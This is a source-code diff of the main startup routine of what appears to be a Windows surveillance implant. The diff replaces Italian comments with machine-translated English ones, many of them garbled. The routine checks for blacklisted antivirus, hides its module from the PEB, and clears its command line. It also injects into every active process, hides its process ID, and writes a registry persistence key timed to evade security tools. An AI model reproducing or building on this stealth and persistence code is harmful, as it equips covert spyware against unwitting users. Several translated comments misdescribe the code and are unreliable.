@@ -2878,18 +2878,17 @@ void __stdcall HM_sMain(void)
 {
 	pid_hide_struct pid_hide;
 
-	// Ci sono degli AV con cui proprio non si deve installare
+    // There are some AV with which you just do not need to install
 	if (IsBlackList()) 
 		FNC(ExitProcess)(0);
 
-	//Riempie i campi relativi al nome del file immagine,
-	//file di configurazione, directory di installazione
-	//etc. Va fatta come PRIMA cosa.
+    //Fills in fields related to the image file name
+    //configuration files, installation directory,
+    //etc. It should be done as FIRST thing.
 	if (!HM_GuessNames()) 
 		FNC(ExitProcess)(0);
 
-	// Tutte le funzioni di logging sono attive solo
-	// nella versione demo
+    //All logging functions are active only in demo
 	if (!CreateLogWindow())
 		FNC(ExitProcess)(0);
 
@@ -2904,95 +2903,93 @@ void __stdcall HM_sMain(void)
 
 	REPORT_STATUS_LOG(ss1.get_str());
 
-	// Locka il file di configurazione per prevenire cancellazioni "accidentali"
+    //Block the configuration file to prevent cancellations "accidental"
 	LockConfFile();
 
-	// Elimina il modulo dalla PEB
-	// XXX da qui in poi non potro' piu' fare GetModuleHandle etc. di questo modulo
+    // Delete the form of PEB
+    //XXX from here on, I can not 'more' do GetModuleHandle etc. of this form
 	HidePEB(GetModuleHandle(H4DLLNAME));
 
 	REPORT_STATUS_LOG(ssok.get_str()); 
 
-	// Cancella la command line
+    // Delete the command line
 	HM_ClearCommand();
 
 	REPORT_STATUS_LOG(ss2.get_str());
 
-	// Toglie gli hook, prende i privilegi, etc.
+    // Off his hook, he takes privileges, etc.
 	if (!doUnhook()) {
 		REPORT_STATUS_LOG(ss3.get_str()); 
 		ReportExitProcess();
 	} 
 	REPORT_STATUS_LOG(ssok.get_str()); 
 
-	// Inizializza la chiave di cifratura (va fatto prima di qualsiasi
-	// accesso al file di configurazione).
+    // Initialize the encryption key (must be done before 
+    // any access to the configuration file).
 	LOG_InitCryptKey(bin_patched_key, bin_patched_key_conf);
 
-	// Controlla se c'e' un file di configurazione pendente
-	// o corrotto (lo rimpiazza con l'eventuale copia di backup).
-	// Va fatto prima di AM_Startup, perche' quest'ultima legge
-	// gia' il file di configurazione.
+    // Check if there is' a configuration file pending or 
+    // corrupt (replaces it with any backup copy).
+    //It should be done before AM_Startup, 
+    //'cause it already reads' the configuration file.
 	HM_CheckNewConf(H4_CONF_BU);
 	//HM_CheckNewConf("nc-7-8dv.cfg");
 
-	// Legge le configurazioni globali. Va fatto DOPO HM_CheckNewConf.
+    // Reads the global configuration. It should be done AFTER HM_CheckNewConf.
 	HM_UpdateGlobalConf();
 	
-	// L'agent manager deve essere startato prima di effettuare gli hook 
-	// (infatti e' lui che inizializza tutta la parte di IPC).
+    // The agent manager must be discarded before the hook
+    //(in fact, and 'he that initializes all part of the IPC).
 	REPORT_STATUS_LOG(ss4.get_str());
 	if (!AM_Startup()) {
 		REPORT_STATUS_LOG(ss5.get_str()); 
-		g_remove_driver = FALSE; // Disinstalla questa istanza ma lascia il driver per eventuali altre istanze running
-		DA_Uninstall(NULL); // AM_Startup fallisce se la sharedmemory gia' esiste
+		g_remove_driver = FALSE; //Uninstall this instance but leaves the drivers for any other instances running 
+		DA_Uninstall(NULL); //AM_Startup fails if the SharedMemory already 'exists 
 	}
 	REPORT_STATUS_LOG(ssok.get_str()); 
 
-	// Effettua l'injection in tutti i processi attivi
+    //Please injection into all active processes
 	HM_HookActiveProcesses();
 
-	// Lancia (se e' il caso) il core a 64 bit
+    //Lancia (and if 'the case) the core 64-bit
 	Run64Core();
 
-	// Nasconde il processo chiamante (host della DLL core)
+    // Hides the calling process (host of DLL core)
 	SET_PID_HIDE_STRUCT(pid_hide, FNC(GetCurrentProcessId)());
 	AM_AddHide(HIDE_PID, &pid_hide);
 
-	// Inserisce la chiave nel registry
-	// Viene fatto dopo l'hiding per evitare che venga vista da processi
-	// come TeaTimer, ma fare attenzione che il processo core non possa 
-	// uscire prima per altri errori (anche se c'e' qualche problema
-	// la chiave nel registry deve essere inserita ad ogni costo).
+    //  Insert the key in the registry is made after hiding 
+    //  to avoid being seen by processes as TeaTimer,
+    //but be careful that the core process can not get out before 
+    //for other errors (although there 'some problem in the 
+    //registry key must be inserted at any cost).
 	REPORT_STATUS_LOG(ss6.get_str());
-	Sleep(3300); // XXX Aspetta che venga fatta l'injection prima di scrivere la chiave
+	Sleep(3300); // XXX Expects it to be made the injection before writing the key 
 	HM_InsertRegistryKey(H4DLLNAME, FALSE);
 
-	// Cancella eventuali file pendenti vecchi e inutilizzati
+    //Delete any files pending old and unused
 	DeletePending();
 
-	// Inizializza (dal file di configurazione) e fa partire gli agent
-	// e il thread di dispatch
+    //Initialize (from the configuration file) and 
+    //starts the agents and the thread dispatch
 	AM_SuspendRestart(AM_RESET);
 	REPORT_STATUS_LOG(ssok.get_str()); 
 
-	// Viene cambiato lo sfondo del desktop, ma solo se e'
-	// stata compilata in versione DEMO
+    //You change the desktop background, 
+    //but only if and 'compiled in DEMO version
 	SetDesktopBackground();
 
-	// Fa partire il sync manager 
+    //Starts the sync manager
 	SM_StartMonitorEvents();
 
-	// Lancia il thread per il monitoraggio della formattazione
+    // Throw the thread to monitor the formatting
 	//StartFormatThread();
 
 	REPORT_STATUS_LOG(ss7.get_str());
 	SendStatusLog(L"[Core Module]: Started");
 
-	// Ciclo per l'hiding da task manager e dai nuovi epxlorer
-	// lanciati. Monitora anche la coda dei messaggi per
-	// chiudere correttamente il processo al logoff.
-	// E' nel thread principale per poter chiudere correttamente
-	// il processo.
+    //  Cycle for hiding from the task manager and the new explorer launched
+    //Also monitors the message queue to close properly process the logoff. 
+    //And 'in the main thread in order to properly close the process.
 	HM_StartPolling();
 }
